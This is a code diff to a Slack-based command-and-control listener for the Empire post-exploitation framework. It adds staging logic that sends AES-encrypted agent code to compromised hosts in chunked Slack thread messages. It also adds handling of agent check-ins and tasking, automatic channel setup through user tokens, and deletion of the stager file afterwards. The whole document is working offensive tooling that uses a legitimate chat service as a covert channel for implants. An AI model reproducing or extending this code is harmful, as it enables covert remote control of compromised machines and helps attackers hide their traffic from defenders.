@@ -195,14 +195,7 @@ class Listener:
                     CommsChannel = channel
 
             if not CommsName in ChannelNames or CommsChannel == None:
-                print helpers.color('[!] No channel "' + CommsName + '", bots can\'t create channels so please fix manually.')
-                return False
-            elif CommsChannel['is_archived']:
-                print helpers.color('[!] Channel "' + CommsName + '" is archived, bots can\'t unarchive channels so please fix manually.')
-                return False
-            elif not CommsChannel['is_member']:
-                print helpers.color('[!] Bot is not a member of channel "' + CommsName + '", bots can\'t join channels so please fix manually.')
-                return False
+                print helpers.color('[!] No channel "' + CommsName + '", please create channel.')
 
             self.options['ChannelComms_ID']['Value'] = CommsChannel['id']
 
@@ -425,6 +418,8 @@ class Listener:
                 getTask = """
                     $script:GetTask = {
 
+                        write-host '[*] Getting tasks'
+
                         try {
 
                             function ConvertFrom-Json20([object] $item){ 
@@ -494,6 +489,8 @@ class Listener:
                     $script:SendMessage = {
                         param($Packets)
 
+                        write-host '[*] Sending messages'
+
                         function ConvertFrom-Json20([object] $item){ 
                             add-type -assembly system.web.extensions
                             $ps_js=new-object system.web.script.serialization.javascriptSerializer
@@ -549,54 +546,45 @@ class Listener:
     def start_server(self, listenerOptions):
 
         # utility function for handling commands
+        def split_data(data):
+            n=3500
+            return [data[i:i+n] for i in range(0, len(data), n)]
+
         def parse_commands(slack_events,bot_id):
 
             # Parses a list of events coming from the Slack RTM API to find commands.
             for event in slack_events:
                 if event["type"] == "message" and event["channel"] != bot_id:
-
+                    
+                    # grab more details such as the username of the poster
                     event_details = slack_client.api_call("channels.history",channel=channel_id,latest=event["ts"],inclusive=True,count=1)
+
                     if 'messages' in event_details:
                         message = event_details["messages"][0]
                         thread_ts = message["ts"]
-                        if 'username' in message:
-                            data = base64.b64decode(message["text"].replace(' ','+'))
+                        
+                        reaction = slack_client.api_call("reactions.add", name='thumbsup', channel=channel_id, timestamp=thread_ts)
+
+                        # by adding a thumbs up helps the listener keep track of what it has processed
+                        if 'username' in message and not 'error' in reaction:
+                            raw_message = message["text"].replace(' ','+')
+                            data = base64.b64decode(raw_message)
                             agent = message["username"]
                             if ':' in agent:
+
                                 agent, stage = agent.split(':')
+                                message = "[*] New message posted to Slack from {}, requesting stage {} and message starts {}...".format(agent,stage,raw_message[:5])
+                                signal = json.dumps({
+                                    'print' : True,
+                                    'message': message
+                                })
+                                dispatcher.send(signal, sender="listeners/slack/{}".format(listener_name))
+
                                 return agent, stage, data, thread_ts
 
             return None, None, None, None
 
         # utility functions for handling Empire
-        def upload_agent(enc_code):
-
-            random_name = ''.join([random.choice(string.ascii_letters + string.digits) for n in range(10)])
-            file_info = user_slack_client.api_call('files.upload',file=enc_code,filename=random_name.lower(),channels=bot_id)
-            
-            if 'file' in file_info:
-                # grab the file id and set the file to public
-                file_id = file_info["file"]["id"]
-                file_info = user_slack_client.api_call('files.sharedPublicURL',file=file_id)
-
-                # generate the perma direct link
-                file_pub = file_info["file"]["permalink_public"].split('/')[-1]
-                file_pub = file_pub.split('-')
-                agent_url = 'https://files.slack.com/files-pri/%s-%s/REPLACE_NAME?pub_secret=%s' % tuple(file_pub)
-                agent_url = agent_url.replace('REPLACE_NAME',file_info["file"]["name"])
-
-                # set the stager URL to use
-                return agent_url
-
-            else:
-                print helpers.color("[!] Something went wrong uploading agent")
-                message = stager_url
-                signal = json.dumps({
-                    'print' : True,
-                    'message': message
-                })
-                dispatcher.send(signal, sender="listeners/slack/{}".format(listener_name))
-
         def upload_stager():
 
             ps_stager = self.generate_stager(listenerOptions=listener_options, language='powershell')
@@ -617,6 +605,7 @@ class Listener:
 
                 # set the stager URL to use
                 self.mainMenu.listeners.activeListeners[listener_name]['stager_url'] = stager_url
+                self.mainMenu.listeners.activeListeners[listener_name]['stager_id'] = file_id
 
             else:
                 print helpers.color("[!] Something went wrong uploading stager")
@@ -636,14 +625,76 @@ class Listener:
         user_api_token = listener_options['UserAPIToken']['Value']
         channel_id = listener_options['ChannelComms_ID']['Value']
         startup_message = listener_options['StartMessage']['Value']
+        channel_name = listener_options['ChannelComms']['Value']
 
         slack_client = SlackClient(api_token)
         user_slack_client = SlackClient(user_api_token)
 
-        if slack_client.rtm_connect(with_team_state=False,auto_reconnect=True):
+        # Read bot's user ID by calling Web API method `auth.test`
+        bot_id = slack_client.api_call("auth.test")["user_id"]
 
-            # Read bot's user ID by calling Web API method `auth.test`
-            bot_id = slack_client.api_call("auth.test")["user_id"]
+
+        # validate Slack API token and configuration
+        SlackChannels = slack_client.api_call('channels.list')
+
+        # if the token is unable to retrieve the list of channels return exact error, most common is bad API token
+        if 'error' in SlackChannels:
+            print helpers.color('[!] An error was returned from Slack: ' + SlackChannels['error'])
+            return False
+        else:
+
+            CommsName   = listener_options['ChannelComms']['Value']
+
+            # build a list of channel names and store the channel info for later use
+            ChannelNames = []
+            CommsChannel = None
+
+            for channel in SlackChannels['channels']:
+                ChannelNames.append(channel['name'])
+                if CommsName == channel['name']:
+                    CommsChannel = channel
+
+
+        # check channels are setup are all ok and if not correct them
+        if not CommsName in ChannelNames or CommsChannel == None:
+            response = user_slack_client.api_call("channels.create", name=channel_name)
+            if not 'error' in response:
+                message = '[+] The channel {} was created in Slack.'.format(channel_name)
+                signal = json.dumps({
+                    'print' : True,
+                    'message': message
+                })
+                dispatcher.send(signal, sender="listeners/slack/{}".format(listener_name))
+            else:
+                print helpers.color('[!] The channel {}, couldn\'t be created.'.format(channel_name))
+                return False
+        elif CommsChannel['is_archived']:
+            response = user_slack_client.api_call("channels.unarchive", channel=channel_id)
+            if not 'error' in response:
+                message = '[+] The channel {} was unarchived in Slack.'.format(channel_name)
+                signal = json.dumps({
+                    'print' : True,
+                    'message': message
+                })
+                dispatcher.send(signal, sender="listeners/slack/{}".format(listener_name))
+            else:
+                print helpers.color('[!] The channel {}, couldn\'t be unarchived.'.format(channel_name))
+                return False
+        elif not CommsChannel['is_member']:
+            response = user_slack_client.api_call("channels.invite", channel=channel_id, user=bot_id)
+            if not 'error' in response:
+                message = '[+] The bot was invited to channel {} in Slack.'.format(channel_name)
+                signal = json.dumps({
+                    'print' : True,
+                    'message': message
+                })
+                dispatcher.send(signal, sender="listeners/slack/{}".format(listener_name))
+            else:
+                print helpers.color('[!] The bot couldn\'t be invited to channel {}.'.format(channel_name))
+                return False
+
+
+        if slack_client.rtm_connect(with_team_state=False,auto_reconnect=True):
 
             while True:
                 #Wait until Empire is aware the listener is running, so we can save our stager URL
@@ -661,7 +712,7 @@ class Listener:
                 slack_client.api_call("chat.postMessage", channel=channel_id, as_user=False, username='listener_' + listener_name, text=startup_message)
             
             # Set the listener in a while loop
-            while True:
+            while slack_client.server.connected is True:
 
                 # sleep for poll interval
                 time.sleep(int(poll_interval))
@@ -673,22 +724,86 @@ class Listener:
                     # if there is some data then proceed
                     if data:
 
+                        # we have data lets grab a list of agents
+                        agent_ids = self.mainMenu.agents.get_agents_for_listener(listener_name)
+
                         if stage == '3':
                             lang, return_val = self.mainMenu.agents.handle_agent_data(staging_key, data, listener_options)[0]
+                            stage_data = base64.encodestring(return_val)
+
+                            message = "[*] Processing stage 3 of the staging process for agent {}, total base64 string length is {}".format(agent,str(len(stage_data)))
+                            signal = json.dumps({
+                                'print' : True,
+                                'message': message
+                            })
+                            dispatcher.send(signal, sender="listeners/slack/{}".format(listener_name))
+
+                            response = slack_client.rtm_send_message(channel_id, stage_data, thread_ts, False)
+
+
+                        elif stage == '5':
 
                             session_key = self.mainMenu.agents.agents[agent]['sessionKey']
                             agent_code = str(self.generate_agent(listener_options, lang))
                             enc_code = encryption.aes_encrypt_then_hmac(session_key, agent_code)
+                            agent_upload = base64.encodestring(enc_code)
 
-                            agent_upload = upload_agent(enc_code)
-                            response = slack_client.api_call("chat.postMessage", channel=channel_id, as_user=False, username='listener_' + listener_name, text=agent_upload, thread_ts=thread_ts)
+                            message = "[*] Processing stage 5 of the staging process for agent {}, total base64 string length is {}".format(agent,str(len(agent_upload)))
+                            signal = json.dumps({
+                                'print' : True,
+                                'message': message
+                            })
+                            dispatcher.send(signal, sender="listeners/slack/{}".format(listener_name))
 
-                            #dispatcher.send(signal, sender="listeners/onedrive/{}".format(listener_name))
-                            #s.delete("%s/drive/items/%s" % (base_url, item['id']))
+                            agent_parts = split_data(agent_upload)
+                            part_count = 1
+                            for part in agent_parts:
+
+                                message = "[*] Sending agent code to Slack for {}, part {} of {} sent".format(agent,str(part_count),str(len(agent_parts)))
+                                signal = json.dumps({
+                                    'print' : True,
+                                    'message': message
+                                })
+                                dispatcher.send(signal, sender="listeners/slack/{}".format(listener_name))
+                                response = slack_client.rtm_send_message(channel_id, part, thread_ts, False)
+
+                                # have to limit the replies to one per second or face rate limiting
+                                time.sleep(1)
+                                part_count += 1
+
+                            # send finish flag to Slack
+                            message = "[*] Sending notification that Slack thread is complete for agent {}.".format(agent)
+                            signal = json.dumps({
+                                'print' : True,
+                                'message': message
+                            })
+                            dispatcher.send(signal, sender="listeners/slack/{}".format(listener_name))
+                            response = slack_client.rtm_send_message(channel_id, '-MESSAGE_END-', thread_ts, False)
+
+                        else:
+
+                            # incoming agent check in
+                            message = "[*] The agent {} just checked in.".format(agent)
+                            signal = json.dumps({
+                                'print' : True,
+                                'message': message
+                            })
+                            dispatcher.send(signal, sender="listeners/slack/{}".format(listener_name))
+
+                            # Process agent checking and handle any agent data
+                            seen_time = dt=datetime.datetime.utcfromtimestamp(float(thread_ts))
+                            self.mainMenu.agents.update_agent_lastseen_db(agent, seen_time)
+                            self.mainMenu.agents.handle_agent_data(staging_key, data, listener_options, update_lastseen=False)
+
+                            # Process any further tasks for the agent so it can continue
+                            task_data = self.mainMenu.agents.handle_agent_request(agent, 'powershell', staging_key, update_lastseen=False)
+                            if task_data:
+                                print helpers.color('[*] '.format(task_data))
+
 
                    
                 except Exception as e:
-                    print helpers.color("[!] Something went wrong with the Slack bot: " + str(e))
+                    pass#print helpers.color("[!] Something went wrong with the Slack bot: " + str(e))
 
         else:
             print helpers.color("[!] Connection failed. Exception printed above.")
@@ -726,6 +841,17 @@ class Listener:
         named listener here.
         """
 
+        # grab the file id and delte the file from Slack no need to waste file space
+        listener_name = self.options['Name']['Value']
+        file_id = self.mainMenu.listeners.activeListeners[listener_name]['stager_id']
+        print helpers.color('[!] Deleting stager that is no longer required, stager id: ' + file_id)
+        user_api_token = self.options['UserAPIToken']['Value']
+        user_slack_client = SlackClient(user_api_token)
+        response = user_slack_client.api_call("files.delete", file=file_id)
+        if 'error' in response:
+            print helpers.color('[!] Failed to delete stager file: ' + response["error"])
+
+        # kill the listener
         if name and name != '':
             print helpers.color("[!] Killing listener '%s'" % (name))
             self.threads[name].kill()
